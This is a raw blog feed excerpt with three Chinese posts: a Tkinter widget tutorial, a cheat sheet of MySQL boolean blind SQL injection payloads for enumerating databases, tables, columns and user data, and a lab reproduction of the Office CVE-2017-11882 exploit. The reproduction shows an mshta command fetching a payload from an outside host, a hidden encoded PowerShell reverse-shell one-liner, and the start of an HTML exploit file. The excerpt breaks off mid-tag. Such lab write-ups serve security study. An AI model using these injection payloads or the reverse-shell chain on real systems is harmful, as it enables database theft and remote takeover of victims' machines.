class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"># 上面组件的条件大多数适用</div><div class="line"># 输入内容，均以 * 显示</div><div class="line">e = Tkinter.Entry(window,show=&apos;*&apos;)</div><div class="line">e.pack()</div><div class="line"></div><div class="line"># 输出，显示出输入的内容</div><div class="line">e1 = Tkinter.Entry(window)</div><div class="line">e1.pack()</div><div class="line"></div><div class="line"># 按钮响应的事件</div><div class="line">def dump():</div><div class="line">    e1.delete(&apos;0&apos;,&apos;end&apos;)     # 删除e1框的所有内容</div><div class="line">    e1.insert(&apos;insert&apos;,e.get()) # 将e中的内容添加到e1中</div><div class="line"></div><div class="line">b = Tkinter.Button(window,text=&apos;dump&apos;,command=dump)</div><div class="line">b.pack()</div><div class="line"></div><div class="line"># e.get 获取框中的内容</div><div class="line"></div><div class="line"># 框中默认显示的内容</div><div class="line"># a = Tkinter.StringVar()</div><div class="line"># a.set(&apos;123&apos;)</div><div class="line"># Tkinter.Entry(window,textvariable=a).pack()</div></pre></td></tr></table></figure><h4 id="Text-文本区域"><a href="#Text-文本区域" class="headerlink" title="Text 文本区域"></a>Text 文本区域</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># 输入内容</div><div class="line">e = Tkinter.Text(window,bg=&apos;black&apos;,fg=&apos;green&apos;,height=2,font=15)</div><div class="line">e.pack()</div><div class="line"></div><div class="line">def get_text():</div><div class="line">    print e.get(&apos;0.0&apos;,&apos;end&apos;) # 打印出文本里面的所有内容</div><div class="line">    e.delete(&apos;0.0&apos;,&apos;end&apos;)    # 删除文本框的内容</div><div class="line"></div><div class="line">b = Tkinter.Button(window,text=&apos;hit me&apos;,bg=&apos;black&apos;,fg=&apos;green&apos;,command=get_text)</div><div class="line">b.pack()</div></pre></td></tr></table></figure><h4 id="Listbox-列表部件"><a href="#Listbox-列表部件" class="headerlink" title="Listbox 列表部件"></a>Listbox 列表部件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">list1 = [1,2,3,4,5,6,7,8,9,0]</div><div class="line"># 创建列表部件</div><div class="line">l = Tkinter.Listbox(window)</div><div class="line">for i in list1:</div><div class="line">    l.insert(&apos;0&apos;,i)</div><div class="line">l.pack()</div><div class="line"></div><div class="line">def get_num():</div><div class="line">    print l.curselection() #查看当前选择项</div><div class="line"></div><div class="line">b = Tkinter.Button(window,text=&apos;hit it&apos;,bg=&apos;black&apos;,fg=&apos;green&apos;,font=&apos;20&apos;,command=get_num)</div><div class="line">b.pack()</div></pre></td></tr></table></figure><h4 id="Radiobutton-选择按钮"><a href="#Radiobutton-选择按钮" class="headerlink" title="Radiobutton 选择按钮"></a>Radiobutton 选择按钮</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">l = Tkinter.Label(window,text=&apos;empty&apos;,bg=&apos;black&apos;,fg=&apos;green&apos;)</div><div class="line">l.pack()</div><div class="line"></div><div class="line">def sel():</div><div class="line">    l[&apos;text&apos;] = &apos;You have select &apos; + var.get()</div><div class="line"></div><div class="line">var = Tkinter.StringVar()</div><div class="line"># variable=var, value=&apos;A&apos;的意思就是，当我们鼠标选中了其中一个选项，把value的值A放到变量var中，然后赋值给variable</div><div class="line">r1 = Tkinter.Radiobutton(window,text=&apos;Option A&apos;,variable=var,value=&apos;A&apos;,command=sel)</div><div class="line">r2 = Tkinter.Radiobutton(window,text=&apos;Option B&apos;,variable=var,value=&apos;B&apos;,command=sel)</div><div class="line">r3 = Tkinter.Radiobutton(window,text=&apos;Option C&apos;,variable=var,value=&apos;C&apos;,command=sel)</div><div class="line">r1.pack()</div><div class="line">r2.pack()</div><div class="line">r3.pack()</div></pre></td></tr></table></figure><h4 id="Scale-尺度（滚动条）"><a href="#Scale-尺度（滚动条）" class="headerlink" title="Scale 尺度（滚动条）"></a>Scale 尺度（滚动条）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">def select(v):                  # 这里的参数 v 即滚动条定位的数据，自动传入</div><div class="line">    print v</div><div class="line"></div><div class="line">scale = Tkinter.Scale(</div><div class="line">window,</div><div class="line">label = &apos;try_me&apos;,               # scale 部件的名称</div><div class="line">from_ = 5,                      # 从 5 开始</div><div class="line">to = 11,                        # 到 11 结束</div><div class="line">orient = Tkinter.HORIZONTAL,    # 设置滚动条的方向为横向</div><div class="line">length = 300,                   # 滚动部件的长度，单位是像素</div><div class="line">showvalue = 0,                  # 0 表示当前数值不在滚动条上方显示，1表示当前数值在滚动条上方显示</div><div class="line">tickinterval = 2,               # 2个坐标点之间的间隔</div><div class="line">resolution = 0.01,              # 保留 2 位小数</div><div class="line">command = select                # 执行的函数</div><div class="line">)</div><div class="line">scale.pack()</div></pre></td></tr></table></figure><h4 id="Checkbutton-勾选项"><a href="#Checkbutton-勾选项" class="headerlink" title="Checkbutton 勾选项"></a>Checkbutton 勾选项</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">var1 = Tkinter.StringVar()</div><div class="line">var2 = Tkinter.StringVar()</div><div class="line"></div><div class="line">def select():</div><div class="line">    if var1.get() == &apos;1&apos; and var2.get() == &apos;1&apos;:</div><div class="line">        print &apos;GOOD&apos;</div><div class="line">    else:</div><div class="line">        print &apos;ERROR&apos;</div><div class="line"></div><div class="line">checkbutton1 = Tkinter.Checkbutton(</div><div class="line">window,</div><div class="line">text = &apos;Python&apos;,    # 显示内容</div><div class="line">variable = var1,    # 将后面的 1 或者 0 放入 var1 中</div><div class="line">onvalue = 1,        # 将 1 传递给 var1</div><div class="line">offvalue = 0,       # 将 0 传递给 var2</div><div class="line">command = select    # 执行函数</div><div class="line">)</div><div class="line"></div><div class="line">checkbutton2 = Tkinter.Checkbutton(window,text = &apos;C++&apos;,variable = var2,onvalue = 1,offvalue = 0,command = select)</div><div class="line"></div><div class="line">checkbutton1.pack()</div><div class="line">checkbutton2.pack()</div></pre></td></tr></table></figure><h4 id="Canvas-画布"><a href="#Canvas-画布" class="headerlink" title="Canvas 画布"></a>Canvas 画布</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">canvas = Tkinter.Canvas(window,bg=&apos;#00FFFF&apos;,width=300,height=300)</div><div class="line">canvas.pack()</div><div class="line"></div><div class="line">image_file = Tkinter.PhotoImage(file=&apos;ins.gif&apos;)                         # 创造一个变量存放 ins.gif</div><div class="line">image = canvas.create_image(10,10,anchor=&apos;nw&apos;,image=image_file)         # 10,10是放置的坐标，abchor=nw则是把图片的左上角作为锚定点，在加上刚刚给的坐标位置，即可将图片位置确定</div><div class="line"></div><div class="line">x0, y0, x1, y1= 50, 50, 80, 80</div><div class="line">line = canvas.create_line(x0, y0, x1, y1)                               # 画直线</div><div class="line"></div><div class="line">oval = canvas.create_oval(x0, y0, x1, y1, fill=&apos;red&apos;)                   # 创建一个圆，填充色为`red`红色</div><div class="line"></div><div class="line">arc = canvas.create_arc(x0+30, y0+30, x1+30, y1+30, start=0, extent=180)# 创建一个扇形，start=0和extent=180，其实就是从0度到180度</div><div class="line"></div><div class="line">rect = canvas.create_rectangle(100, 30, 100+20, 30+20)                  #创建一个矩形</div></pre></td></tr></table></figure><h4 id="Menu-菜单"><a href="#Menu-菜单" class="headerlink" title="Menu 菜单"></a>Menu 菜单</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 单一标签</div><div class="line">menubar = Tkinter.Menu(window)</div><div class="line">menubar.add_command(label=&apos;quit&apos;,command=quit)</div><div class="line">window.config(menu=menubar)</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"># 分级标签</div><div class="line">menubar = Tkinter.Menu(window)</div><div class="line"></div><div class="line">filemenu = Tkinter.Menu(menubar,tearoff=0)</div><div class="line">filemenu.add_command(label=&apos;quit&apos;,command=quit)</div><div class="line">filemenu.add_command(label=&apos;quit_again&apos;,command=quit)</div><div class="line">filemenu.add_separator()</div><div class="line">filemenu.add_command(label=&apos;last_again&apos;,command=quit)</div><div class="line">menubar.add_cascade(label=&apos;QUIT&apos;,menu=filemenu)</div><div class="line"></div><div class="line">window.config(menu=menubar)</div></pre></td></tr></table></figure><h4 id="Frame-窗口"><a href="#Frame-窗口" class="headerlink" title="Frame 窗口"></a>Frame 窗口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Tkinter.Label(window,text=&apos;on the window&apos;).pack()   # 定义一个label显示 on the window</div><div class="line">frm = Tkinter.Frame(window)                         # 在 window 上创建一个面板 frm</div><div class="line">frm.pack()</div><div class="line"></div><div class="line">frm_l = Tkinter.Frame(frm)                          # 在frm上再创建 2 个面板</div><div class="line">frm_r = Tkinter.Frame(frm)</div><div class="line"></div><div class="line">frm_l.pack(side=&apos;left&apos;)</div><div class="line">frm_r.pack(side=&apos;right&apos;)</div><div class="line"></div><div class="line">Tkinter.Label(frm,text=&apos;this is frm&apos;).pack()</div><div class="line">Tkinter.Label(frm_l,text=&apos;this is frm_l&apos;).pack()</div><div class="line">Tkinter.Label(frm_r,text=&apos;this is frm_r&apos;).pack()</div></pre></td></tr></table></figure><h4 id="tkMessageBox-弹窗"><a href="#tkMessageBox-弹窗" class="headerlink" title="tkMessageBox 弹窗"></a>tkMessageBox 弹窗</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import tkMessageBox</div><div class="line"></div><div class="line">def hit_me():</div><div class="line">    tkMessageBox.showinfo(title=&apos;HELLO&apos;, message=&apos;hahaha&apos;)          # 提示信息对话框</div><div class="line">    tkMessageBox.showwarning(title=&apos;ERROR&apos;, message=&apos;Dont do this&apos;) # 提出警告对话窗</div><div class="line">    tkMessageBox.showerror(title=&apos;emmm&apos;, message=&apos;error&apos;)           # 提出错误对话窗</div><div class="line">    tkMessageBox.askquestion(title=&apos;What?&apos;, message=&apos;Chooise one&apos;)  # 询问选择对话窗，返回 yes 和 no </div><div class="line"></div><div class="line">Tkinter.Button(window,text=&apos;hit_me&apos;,command=hit_me).pack()</div></pre></td></tr></table></figure><h2 id="排版方式-layout"><a href="#排版方式-layout" class="headerlink" title="排版方式 layout"></a>排版方式 layout</h2><h4 id="pack"><a href="#pack" class="headerlink" title="pack()"></a>pack()</h4><p>按照上下左右的方式排列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Tkinter.Label(window,text=&apos;left&apos;).pack(side=&apos;left&apos;)</div><div class="line">Tkinter.Label(window,text=&apos;right&apos;).pack(side=&apos;right&apos;)</div><div class="line">Tkinter.Label(window,text=&apos;top&apos;).pack(side=&apos;top&apos;)</div><div class="line">Tkinter.Label(window,text=&apos;bottom&apos;).pack(side=&apos;bottom&apos;)</div></pre></td></tr></table></figure><h4 id="grid"><a href="#grid" class="headerlink" title="grid"></a>grid</h4><p>grid 是方格, 所以所有的内容会被放在这些规律的方格中.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># row 表示行，column表示列，padx表示左右间距，pady表示上下间距</div><div class="line">Tkinter.Label(window,text=&apos;1&apos;).grid(row=1,column=1,padx=10, pady=10)</div><div class="line">Tkinter.Label(window,text=&apos;2&apos;).grid(row=2,column=2,padx=10, pady=10)</div><div class="line">Tkinter.Label(window,text=&apos;3&apos;).grid(row=3,column=3,padx=10, pady=10)</div><div class="line">Tkinter.Label(window,text=&apos;4&apos;).grid(row=4,column=4,padx=10, pady=10)</div><div class="line">Tkinter.Button(window,text=&apos;hit me&apos;,command=quit).grid(row=5,column=5,padx=10,pady=10)</div></pre></td></tr></table></figure><h4 id="place"><a href="#place" class="headerlink" title="place"></a>place</h4><p>就是给精确的坐标来定位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># x坐标，y坐标，anchor=&apos;nw&apos; ==&gt; north west 西北角开始</div><div class="line">Tkinter.Label(window,text=&apos;1&apos;).place(x=200,y=100,anchor=&apos;nw&apos;)</div><div class="line">Tkinter.Button(window,text=&apos;hit me&apos;,command=quit).place(x=500,y=300,anchor=&apos;nw&apos;)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer9&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer9&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt; Tkinter 模块(Tk 接口)是 Python 的标准 Tk GUI 工具包的接口 .Tk 和 Tkinter 可以在大多数的 Unix 平台下使用,同样可以应用在 Windows 和 Macintosh 系统里。Tk8.0 的后续版本可以实现本地窗口风格,并良好地运行在绝大多数平台中。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://damit5.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>MySQL基于布尔型盲注常用语句</title>
    <link href="https://damit5.com/2017/11/26/MySQL%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/"/>
    <id>https://damit5.com/2017/11/26/MySQL基于布尔型盲注常用语句/</id>
    <published>2017-11-26T02:28:02.000Z</published>
    <updated>2018-06-10T03:51:21.180Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer5" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer5"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h3 id="什么是盲注？"><a href="#什么是盲注？" class="headerlink" title="什么是盲注？"></a>什么是盲注？</h3><p>基于布尔型SQL盲注即在SQL注入过程中，应用程序仅仅返回True（页面）和False（页面）。<br>这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。</p><a id="more"></a><h3 id="常用语句汇总"><a href="#常用语句汇总" class="headerlink" title="常用语句汇总"></a>常用语句汇总</h3><hr><h4 id="查询所有数据库"><a href="#查询所有数据库" class="headerlink" title="查询所有数据库"></a>查询所有数据库</h4><h5 id="1-判断表存不存在"><a href="#1-判断表存不存在" class="headerlink" title="1.判断表存不存在"></a>1.判断表存不存在</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and  exists(select * from information_schema.tables)</div></pre></td></tr></table></figure><h5 id="2-判断存在多少个库"><a href="#2-判断存在多少个库" class="headerlink" title="2.判断存在多少个库"></a>2.判断存在多少个库</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and  (select count(distinct+table_schema) from information_schema.tables)&gt;4</div></pre></td></tr></table></figure><h5 id="3-判断库名的长度"><a href="#3-判断库名的长度" class="headerlink" title="3.判断库名的长度"></a>3.判断库名的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select length(table_schema) from information_schema.tables limit 0,1) &gt;17</div></pre></td></tr></table></figure><h5 id="4-接下来爆每个库的库名"><a href="#4-接下来爆每个库的库名" class="headerlink" title="4.接下来爆每个库的库名"></a>4.接下来爆每个库的库名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and  (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1),1,1)))&gt;104</div></pre></td></tr></table></figure><h5 id="5-猜表，首先判断表的长度"><a href="#5-猜表，首先判断表的长度" class="headerlink" title="5.猜表，首先判断表的长度"></a>5.猜表，首先判断表的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select length(table_name) from information_schema.tables where table_schema=&apos;information_schema&apos; limit 0,1) &gt;13</div></pre></td></tr></table></figure><h5 id="6-判断完表的长度之后就要开始猜解表的字符"><a href="#6-判断完表的长度之后就要开始猜解表的字符" class="headerlink" title="6.判断完表的长度之后就要开始猜解表的字符"></a>6.判断完表的长度之后就要开始猜解表的字符</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select ascii(substr((select table_name from information_schema.tables where table_schema=&apos;information_schema&apos; limit 0,1),1,1))) &gt;66</div></pre></td></tr></table></figure><h5 id="7-再接下来猜解表里边的字段即列-首先统计一下有多少个字段"><a href="#7-再接下来猜解表里边的字段即列-首先统计一下有多少个字段" class="headerlink" title="7.再接下来猜解表里边的字段即列,首先统计一下有多少个字段"></a>7.再接下来猜解表里边的字段即列,首先统计一下有多少个字段</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select count(column_name) from information_schema.columns where table_schema=&apos;information_schema&apos; and table_name=&apos;CHARACTER_SETS&apos; ) &gt;4</div></pre></td></tr></table></figure><h5 id="8-判断每个字段的长度"><a href="#8-判断每个字段的长度" class="headerlink" title="8.判断每个字段的长度"></a>8.判断每个字段的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select length(column_name) from information_schema.columns where table_schema=&apos;information_schema&apos; and table_name=&apos;CHARACTER_SETS&apos; limit 0,1 ) &gt;17</div></pre></td></tr></table></figure><h5 id="9-接下来猜第一个字段的字符"><a href="#9-接下来猜第一个字段的字符" class="headerlink" title="9.接下来猜第一个字段的字符"></a>9.接下来猜第一个字段的字符</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select ascii(substr((select column_name from information_schema.columns where table_schema=&apos;information_schema&apos; and table_name=&apos;CHARACTER_SETS&apos; limit 0,1),1,1)) ) &gt;66</div></pre></td></tr></table></figure><hr><h4 id="查询当前数据库"><a href="#查询当前数据库" class="headerlink" title="查询当前数据库"></a>查询当前数据库</h4><h5 id="1-查询数据库的长度"><a href="#1-查询数据库的长度" class="headerlink" title="1.查询数据库的长度"></a>1.查询数据库的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and length(database()) &gt; 4</div></pre></td></tr></table></figure><h5 id="2-查询数据库名"><a href="#2-查询数据库名" class="headerlink" title="2.查询数据库名"></a>2.查询数据库名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and ascii(substr((select database()),1,1)) &gt; 99</div></pre></td></tr></table></figure><h5 id="3-查询表名的长度"><a href="#3-查询表名的长度" class="headerlink" title="3.查询表名的长度"></a>3.查询表名的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select(length(table_name)) from information_schema.tables where table_schema = 0x64767761 limit 0,1) &gt; 8+--+</div></pre></td></tr></table></figure><h5 id="4-查询表名"><a href="#4-查询表名" class="headerlink" title="4.查询表名"></a>4.查询表名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and ascii(substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 1,1),1,1)) &gt; 116</div></pre></td></tr></table></figure><h5 id="5-查询列名的长度"><a href="#5-查询列名的长度" class="headerlink" title="5.查询列名的长度"></a>5.查询列名的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select(length(column_name)) from information_schema.columns where table_name = 0x7573657273 limit 0,1) &gt; 6</div></pre></td></tr></table></figure><h5 id="6-查询列名"><a href="#6-查询列名" class="headerlink" title="6.查询列名"></a>6.查询列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1,1)) &gt; 116</div></pre></td></tr></table></figure><h5 id="7-查询字段的长度"><a href="#7-查询字段的长度" class="headerlink" title="7.查询字段的长度"></a>7.查询字段的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select length(column_name) from information_schema.columns where table_name=0x7573657273 limit 1,1 ) &gt;10</div></pre></td></tr></table></figure><h5 id="8-爆出字段"><a href="#8-爆出字段" class="headerlink" title="8.爆出字段"></a>8.爆出字段</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and ascii(substr((select user from dvwa.users limit 0,1),1,1)) &gt; 96</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer5&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer5&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;h3 id=&quot;什么是盲注？&quot;&gt;&lt;a href=&quot;#什么是盲注？&quot; class=&quot;headerlink&quot; title=&quot;什么是盲注？&quot;&gt;&lt;/a&gt;什么是盲注？&lt;/h3&gt;&lt;p&gt;基于布尔型SQL盲注即在SQL注入过程中，应用程序仅仅返回True（页面）和False（页面）。&lt;br&gt;这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://damit5.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Microsoft Office内存损坏漏洞（CVE–2017–11882) 复现</title>
    <link href="https://damit5.com/2017/11/22/Microsoft-Office%E5%86%85%E5%AD%98%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE%E2%80%932017%E2%80%9311882-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://damit5.com/2017/11/22/Microsoft-Office内存损坏漏洞（CVE–2017–11882-复现/</id>
    <published>2017-11-22T03:08:28.000Z</published>
    <updated>2018-06-10T03:47:35.131Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer3" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer3"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h2 id="0x00背景"><a href="#0x00背景" class="headerlink" title="0x00背景"></a>0x00背景</h2><p>2017年11月，微软在例行系统补丁发布中，修复了一个Office远程代码执行的严重漏洞，编号CVE-2017-11882。该漏洞类型为缓冲区溢出，位为EQNEDT32.EXE组件。受害用户打开恶意的office文档时，无需交互，就可能执行恶意代码。</p><p>据悉，这个组件是由Design Science Inc.开发的，后来由微软收购。该组件于2001年编译嵌入office，之后没有任何进一步的修改。所以该漏洞已存在17年之久。影响现阶段流行的所有office版本。<br><a id="more"></a></p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h2><p>EQNEDT32.EXE是用于在文档中插入和编辑方程式。插入到文档中的任何公式都是OLE对象。该组件是在OLE技术规范下设计的。首发于Microsoft Office 2000和Microsoft 2003。从Microsoft Office 2007套件开始，显示和编辑方程的方法发生了变化，虽然EQNEDT32.EXE变得过时，不过，为了保持版本兼容性，它并没有从Office套件中删除。</p><p>EQNEDT32.EXE为OLE实现了一组标准的COM接口。</p><ul><li><p>IOleObject</p></li><li><p>IDataObject</p></li><li><p>IOleInPlaceObject</p></li><li><p>IOleInPlaceActiveObject</p></li><li><p>IpersistStorage</p></li></ul><p>而问题的就在于IpersistStorage：Load这个位置。因为历史久远，该组件开发的时候并没有例如ASLR这样的漏洞缓解措施。利用起来更加的方便。</p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h4 id="1-生成反弹-shell-的一句话"><a href="#1-生成反弹-shell-的一句话" class="headerlink" title="1.生成反弹 shell 的一句话"></a>1.生成反弹 shell 的一句话</h4><p>生成 shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mshta.exe &quot;//192.168.9.172:8080/6QYqdXU&quot;</div></pre></td></tr></table></figure></p><p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/4D27.50pEOiV2kj7.2TDwLkoI*ucTWf1s*Nd4hcL7jA!/r/dA0BAAAAAAAA" alt="1"></p><h4 id="2-访问该-url-，下载文件，获取-powershell-一句话"><a href="#2-访问该-url-，下载文件，获取-powershell-一句话" class="headerlink" title="2.访问该 url ，下载文件，获取 powershell 一句话"></a>2.访问该 url ，下载文件，获取 powershell 一句话</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell.exe -nop -w hidden -e *******************</div></pre></td></tr></table></figure><h4 id="3-新建文件，例如-abc"><a href="#3-新建文件，例如-abc" class="headerlink" title="3.新建文件，例如 abc"></a>3.新建文件，例如 abc</h4><p>将 <code>calc.exe</code> 换成上面的 <code>powershell</code> 一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;HTML&gt; </div><div class="line">&lt;meta 